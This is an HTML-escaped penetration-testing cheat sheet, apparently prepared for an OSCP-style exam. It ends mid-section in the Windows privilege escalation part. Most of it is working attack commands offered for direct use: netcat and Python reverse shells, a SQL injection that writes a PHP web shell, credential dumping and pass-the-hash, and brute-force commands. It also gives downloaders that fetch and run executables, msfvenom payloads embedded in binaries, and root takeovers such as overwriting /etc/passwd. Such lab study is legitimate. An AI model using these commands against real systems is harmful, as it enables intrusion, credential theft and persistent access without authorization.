&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Simple Zone Transfer Bash Script 
#!/bin/bash 
# $1 is the first argument given after the bash script 
# Check if argument was given, if not, print usage 
if [ -z &quot;$1&quot; ]; then 
echo &quot;[*] Simple Zone transfer script&quot; 
echo &quot;[*] Usage 
: $0 &amp;lt;domain name&amp;gt; &quot; 
exit 0 
fi 
# if argument was given, identify the DNS servers for the domain 
for server in $(host -t ns $1 |cut -d&quot; &quot; -f4);do 
# For each of these servers, attempt a zone transfer 
host -l $1 $server |grep &quot;has address&quot; 
done 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
&lt;p&gt;General enumeration:
&lt;code class=&quot;highlighter-rouge&quot;&gt;enum4linux -a [IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Scan for open shares:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nbtscan -r [IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;OS discovery:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -v -p 139, 445 --script=smb-os-discovery [IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;SMB vuln scan:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -v -p 139,445 --script=smb-vuln* --script-args=unsafe=1 &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Finding version of SMB: Use &lt;a href=&quot;https://raw.githubusercontent.com/rewardone/OSCPRepo/master/scripts/recon_enum/smbver.sh&quot;&gt;this script&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;SMBMap:
&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H [IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;View share names:
&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -L [IP] -N&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Connecting to an SMB share:
&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient \\\\[IP]\\[share name]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Mount shares:
&lt;code class=&quot;highlighter-rouge&quot;&gt;mount -t cifs //[IP]/[share name] [folder to mount to] -o username=[username],vers=1.0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Common exploits: &lt;a href=&quot;https://www.exploit-db.com/exploits/40279&quot;&gt;MS08-067&lt;/a&gt; and &lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;MS17-010&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;

&lt;p&gt;Brute force directories:
&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u [URL] -w /usr/share/wordlists/dirb/common.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Scanning for possible vulns:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nikto --host [IP address]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Scanning for vulns in Wordpress:
&lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --url [URL]&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h3&gt;
&lt;p&gt;Netcat reverse shell (target): &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nv [your IP] [port] -e cmd.exe&lt;/code&gt;. Replace cmd.exe with /bin/sh if the target is on linux.&lt;/p&gt;

&lt;p&gt;Netcat reverse shell listener (local): &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nlvp 4444&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Python reverse shell: Make a local reverse shell listener, then run &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt; on the target (change the IP and port in the code).&lt;/p&gt;

&lt;p&gt;Amazing PHP reverse shell that I use all the time: &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A list of other handy reverse shells: &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h3&gt;
&lt;p&gt;Useful guides: &lt;a href=&quot;http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html&quot;&gt;Security Idiots&lt;/a&gt; and &lt;a href=&quot;http://pentestmonkey.net/category/cheat-sheet/sql-injection&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Find the number of columns: Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;order by [count]&lt;/code&gt; instruction in your SQL injection. Start with 1, and then gradually increment count until you get an error.&lt;/p&gt;

&lt;p&gt;Adding your own select statement: Type in a normal query value and then type in &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,5,6&lt;/code&gt;. Note that both statements must have the same number of columns.&lt;/p&gt;

&lt;p&gt;Discover MySQL version: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,@@version,6&lt;/code&gt;. Obviously, you’ll have to modify this to use the correct number of columns.&lt;/p&gt;

&lt;p&gt;Discover the current user: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,user(),6&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Getting a list of tables: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,table_name,6 FROM information_schema.tables&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Getting the names of columns of a table: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,column_name,6 from information_schema.columns where table_name='users'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Concatenate strings from two columns in to a single column: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,concat(column1,0x3a,column2) from table_name&lt;/code&gt;. Replace column1, column2, and table_name with the correct values.&lt;/p&gt;

&lt;p&gt;Limit the number of rows returned: &lt;code class=&quot;highlighter-rouge&quot;&gt;LIMIT [rows]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Reading local files in MySQL: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,load_file('file/path'),6&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Writing local files: &lt;code class=&quot;highlighter-rouge&quot;&gt;'union all select 1,2,3,4,&quot;&amp;lt;?php echo shell_exec($_GET['cmd']);?&amp;gt;&quot;,6 into OUTFILE 'backdoor.php'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;MS-SQL instant root: Sometimes you can instantly root the machine if you have DB credentials for MSSQL. &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 443 -Pn -sS --script ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=password,mssql.instance-all,ms-sql-xp-cmdshell.cmd=&quot;whoami&quot; [IP]&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;lfirfi&quot;&gt;LFI/RFI&lt;/h3&gt;
&lt;p&gt;Suppose you have the ability to include any local php file on the target, and also suppose that you could write any php script to the target. You could write the following PHP code: &lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt; to obtain code execution via the cmd parameter.&lt;/p&gt;

&lt;p&gt;For RFIs, you can just set the PHP include parameter to be a file on your local web server that gives you code execution.&lt;/p&gt;

&lt;p&gt;For more information on LFI/RFI vulns, &lt;a href=&quot;https://hackersonlineclub.com/lfi-rfi/&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;password-attacks&quot;&gt;Password Attacks&lt;/h3&gt;
&lt;p&gt;List of default credentials: &lt;a href=&quot;http://open-sez.me/&quot;&gt;Open-sez.me&lt;/a&gt; and &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv&quot;&gt;Default-passwords&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Wordlists: Kali has wordlists located under /usr/share/wordlists/. There is also a common usernames file under /usr/share/commix/src/txt/usernames.txt&lt;/p&gt;

&lt;p&gt;Generate all possible combinations of a list of characters: &lt;code class=&quot;highlighter-rouge&quot;&gt;crunch [min] [max] [list of characters] -o [output file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Generate password lists using words from a website: &lt;code class=&quot;highlighter-rouge&quot;&gt;cewl [URL]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force websites using Medusa: &lt;code class=&quot;highlighter-rouge&quot;&gt;medusa -h [IP] -U [usernames file] -P [passwords file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Wordpress brute force: &lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --log --batch --url [IP address] --wordlist /usr/share/wordlists/rockyou.txt --username [username] --threads 20&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force web logins: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -l [user] -p [password] [IP] http-post-form &quot;&amp;lt;Login Page&amp;gt;:&amp;lt;Request Body&amp;gt;:&amp;lt;Error message&amp;gt;&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force RDP: &lt;code class=&quot;highlighter-rouge&quot;&gt;ncrack -vv --user [user] -P [passwords file] rdp://[IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force SNMP: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -P [passwords file] -v [IP] snmp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force SSH: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -l root -P [passwords file] [IP] ssh&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Dumping windows password hashes: Send over /usr/share/windows-binaries/fgdump.exe over to the target, and then run fgdump.exe. It will output files in a pwdump file.&lt;/p&gt;

&lt;p&gt;Windows credential editor: WCE can search for passwords and steal credentials from memory. It is located under the /usr/share/wce/ directory in Kali.&lt;/p&gt;

&lt;p&gt;Brute force pwdump (fgdump output): &lt;code class=&quot;highlighter-rouge&quot;&gt;john --wordlist=/usr/share/wordlists/rockyou.txt [pwdump file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Cracking linux hashes (you will need both /etc/passwd and /etc/shadow):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unshadow passwd-file.txt shadow-file.txt &amp;gt; unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Brute force password-protected zip files:
&lt;code class=&quot;highlighter-rouge&quot;&gt;fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt [zip file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Pass-the-hash for SMB:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export SMBHASH=[Hash]
pth-winexe -U administrator% //[IP] cmd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you want to login to SMB, you could also do &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -u [username] -p [hash] -H [IP]&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;file-uploaddownload&quot;&gt;File Upload/Download&lt;/h3&gt;
&lt;p&gt;&lt;b&gt;Netcat:&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;On the receiving end: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -l -p 1234 &amp;gt; file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;On the sending end: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc [destination] 1234 &amp;lt; file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;pyftpdlib:&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;On Kali Linux:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp folder/to/share
pip install pyftpdlib
python -m pyftpdlib -w -p 21
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp [your IP]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;On the target, you could also write down the ftp commands you’ll use in a file and then run &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp -s:ftp_commands.txt&lt;/code&gt;. The first line should be &lt;code class=&quot;highlighter-rouge&quot;&gt;open [IP address]&lt;/code&gt;, and the next two lines should be the username and password (if the username is anonymous, you can set the password to be anything, but it must be something).&lt;/p&gt;

&lt;p&gt;&lt;b&gt;smbserver.py&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;On Kali:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
smbserver.py a file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;\\[your IP]\a\file&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;TFTP&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;On Kali:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir tftp/
atftpd --daemon --port 69 tftp/
cp [file to send] tftp/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;tftp -i [your IP] get [file]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;HTTP&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Setup a web server on Kali using &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl enable apache2&lt;/code&gt;. Copy the file that you want to send to /var/www/html/. Then navigate to http://[your IP]/file on the target system’s web browser. If you are unable to access the target system’s web browser, create a script called wget.vbs on the target machine by running the following code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo strUrl = WScript.Arguments.Item(0) &amp;gt; wget.vbs 
echo StrFile = WScript.Arguments.Item(1) &amp;gt;&amp;gt; wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &amp;gt;&amp;gt; wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &amp;gt;&amp;gt; wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &amp;gt;&amp;gt; wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &amp;gt;&amp;gt; wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &amp;gt;&amp;gt; wget.vbs 
echo Err.Clear &amp;gt;&amp;gt; wget.vbs 
echo Set http = Nothing &amp;gt;&amp;gt; wget.vbs 
echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &amp;gt;&amp;gt; wget.vbs 
echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &amp;gt;&amp;gt; wget.vbs 
echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &amp;gt;&amp;gt; wget.vbs 
echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &amp;gt;&amp;gt; wget.vbs 
echo http.Open &quot;GET&quot;, strURL, False &amp;gt;&amp;gt; wget.vbs 
echo http.Send &amp;gt;&amp;gt; wget.vbs 
echo varByteArray = http.ResponseBody &amp;gt;&amp;gt; wget.vbs 
echo Set http = Nothing &amp;gt;&amp;gt; wget.vbs 
echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &amp;gt;&amp;gt; wget.vbs 
echo Set ts = fs.CreateTextFile(StrFile, True) &amp;gt;&amp;gt; wget.vbs 
echo strData = &quot;&quot; &amp;gt;&amp;gt; wget.vbs 
echo strBuffer = &quot;&quot; &amp;gt;&amp;gt; wget.vbs 
echo For lngCounter = 0 to UBound(varByteArray) &amp;gt;&amp;gt; wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &amp;gt;&amp;gt; wget.vbs 
echo Next &amp;gt;&amp;gt; wget.vbs 
echo ts.Close &amp;gt;&amp;gt; wget.vbs 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then execute &lt;code class=&quot;highlighter-rouge&quot;&gt;cscript wget.vbs http://[your IP]/file&lt;/code&gt; on the target machine.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Powershell&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;For targets that have powershell installed, you can create a powershell script to download a file from a webserver. Setup a webserver on Kali Linux using &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl enable apache2&lt;/code&gt;, and move the file you want to send to /var/www/html. Run this on the target:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo $storageDir = $pwd &amp;gt; wget.ps1 
echo $webclient = New-Object System.Net.WebClient &amp;gt;&amp;gt;wget.ps1 
echo $url = &quot;http://10.11.0.5/file&quot; &amp;gt;&amp;gt;wget.ps1 
echo $file = &quot;new-exploit.exe&quot; &amp;gt;&amp;gt;wget.ps1 
echo $webclient.DownloadFile($url,$file) &amp;gt;&amp;gt;wget.ps1 
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;msfvenom&quot;&gt;Msfvenom&lt;/h3&gt;
&lt;p&gt;Common payloads:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;windows/shell_reverse_tcp&lt;/li&gt;
  &lt;li&gt;windows/shell/reverse_tcp (staged)&lt;/li&gt;
  &lt;li&gt;php/reverse_php&lt;/li&gt;
  &lt;li&gt;windows/meterpreter/reverse_https (popular for looking just like normal web traffic)&lt;/li&gt;
  &lt;li&gt;linux/x86/shell_reverse_tcp&lt;/li&gt;
  &lt;li&gt;linux/x86/shell/reverse_tcp (staged)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Creating a windows reverse shell: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Avoiding bad characters: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d&quot; &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Prevent the process from exiting: Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;EXITFUNC=thread&lt;/code&gt; option when using msfvenom.&lt;/p&gt;

&lt;p&gt;Injecting a payload into an existing PE executable: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f exe -e x86/shikata_ga_nai -i 9 -x binary_to_inject_into.exe -o shell_reverse_msf_encoded_embedded.exe&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;upgrading-shell&quot;&gt;Upgrading Shell&lt;/h3&gt;

&lt;p&gt;On a Kali Linux terminal, use &lt;code class=&quot;highlighter-rouge&quot;&gt;stty -a&lt;/code&gt; to see information about your window. On the victim, run &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt; (if the victim does not have Python installed, &lt;a href=&quot;https://netsec.ws/?p=337&quot;&gt;click here&lt;/a&gt; to get a list of other commands that you can run). After running the command to spawn a TTY shell, Ctrl-Z out of the reverse shell you’re currently in, and type in the following three commands:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stty raw -echo
fg
reset
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Note that your terminal may get messed up while doing this and print out random characters, but once you type in “reset”, it should go back to normal. Now all you have to do is type in the following three commands:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export SHELL=bash
export TERM=[terminal type]
stty rows [rows] columns [134]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;You should know how many rows and columns you have because when you typed in &lt;code class=&quot;highlighter-rouge&quot;&gt;stty -a&lt;/code&gt; earlier, it printed out this information. The terminal type can vary depending on what kind of terminal you have, but I used “xterm-256color” as my terminal type.&lt;/p&gt;

&lt;h3 id=&quot;linux-privesc&quot;&gt;Linux Privesc&lt;/h3&gt;

&lt;p&gt;Find the version of linux: &lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Add public key to list of authorized SSH keys: &lt;code class=&quot;highlighter-rouge&quot;&gt;echo $(wget http://[your IP]/.ssh/id_rsa.pub) &amp;gt;&amp;gt; ~/.ssh/authorized_keys &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;C Code for becoming root (required for some exploits): &lt;code class=&quot;highlighter-rouge&quot;&gt;echo -e '#include &amp;lt;stdio.h&amp;gt;\n#include &amp;lt;sys/types.h&amp;gt;\n#include &amp;lt;unistd.h&amp;gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem(&quot;/bin/bash&quot;);\n}' &amp;gt; setuid.c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If /etc/password has incorrect permissions, execute this code to instantly become root: &lt;code class=&quot;highlighter-rouge&quot;&gt;echo 'root::0:0:root:/root:/bin/bash' &amp;gt; /etc/passwd; su&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Changing PATH: If you can change the PATH variable, run &lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=.$PATH&lt;/code&gt; to add the current folder to the PATH variable. Create a poisoned executable by typing in &lt;code class=&quot;highlighter-rouge&quot;&gt;echo &quot;usermod -aG sudo [username]&quot; &amp;gt;&amp;gt; /tmp/yo&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x yo&lt;/code&gt;. Replace yo with the name of a binary that is executed by root by another command or process. If you’re still confused, have a look at &lt;a href=&quot;http://techblog.rosedu.org/exploiting-environment-variables.html&quot;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Add to sudoers: Run &lt;code class=&quot;highlighter-rouge&quot;&gt;usermod -aG sudo [username]&lt;/code&gt;. You could also try seeing if you have permission to edit the /etc/sudoers file using &lt;code class=&quot;highlighter-rouge&quot;&gt;visudo&lt;/code&gt;. Sometimes, if you’re lucky, you can instantly get root by doing &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Print commands that we are allowed to run as sudo: &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you see a command in this list that allows you execute code, then you can execute code as root. For example, if we are allowed to use the find command as sudo, you can use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo find /home -exec sh -i\;&lt;/code&gt;. Another example: if we are allowed to use the python command as sudo, you can use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo python -c &quot;import pty; pty.spawn('/bin/bash');&quot;&lt;/code&gt;. You can use &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; to get a list of things that you can do when you are able to execute something as root.&lt;/p&gt;

&lt;p&gt;Exploit cron jobs: You can find cron jobs using &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -la /etc/cron.d&lt;/code&gt;. If you can write to any of the files controlling the cron job, you can write your own command at the end of a cron job and have it be executed as root. For example, if you see a cron job called “update”, you can search for the sh file that is running that cron job using &lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm 2 -type f 2&amp;gt;/dev/null | grep update&lt;/code&gt;, and then you can modify it.&lt;/p&gt;

&lt;p&gt;Print out binaries that have the SUID bit set: &lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm -u=s type f 2&amp;gt;/dev/null&lt;/code&gt;. Sometimes &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; can help you escalate privileges if you see an SUID binary.&lt;/p&gt;

&lt;p&gt;Script to extract passwords from known locations: &lt;a href=&quot;https://github.com/0xmitsurugi/gimmecredz&quot;&gt;gimmecredz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Enumeration scripts:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py&quot;&gt;linuxprivchecker.py&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/mzet-/linux-exploit-suggester&quot;&gt;linux-exploit-suggester&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Good checklists:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://guif.re/linuxeop&quot;&gt;Guif.re&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;g0tmi1k&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://payatu.com/guide-linux-privilege-escalation&quot;&gt;payatu&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;windows-privesc&quot;&gt;Windows Privesc&lt;/h3&gt;

&lt;p&gt;Get system info: &lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List environment variables: &lt;code class=&quot;highlighter-rouge&quot;&gt;set&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List your privileges: &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami /priv&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Overwriting an Executable with Insecure Permissions:
Create a program called useradd.c on either the target (preferable, but if they don’t have gcc, you can’t do this) or on Kali.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt; 

int main () { 
    int i; 
    i=system (&quot;net localgroup administrators low /add&quot;); 
    return 0; 
} 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Replace low with the name of your current user. Compile useradd.c using &lt;code class=&quot;highlighter-rouge&quot;&gt;i686-w64-mingw32-gcc -o tooverwrite.exe useradd.c&lt;/code&gt;, and move the exexcutable to the same directory as the executable that you want to overwrite.&lt;/p&gt;

&lt;p&gt;List scheduled tasks: &lt;code class=&quot;highlighter-rouge&quot;&gt;schtasks /query /fo LIST /v&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List running services: &lt;code class=&quot;highlighter-rouge&quot;&gt;tasklist /SVC&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List started services: &lt;code class=&quot;highlighter-rouge&quot;&gt;net start&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;See what software is installed:&lt;/p&gt;
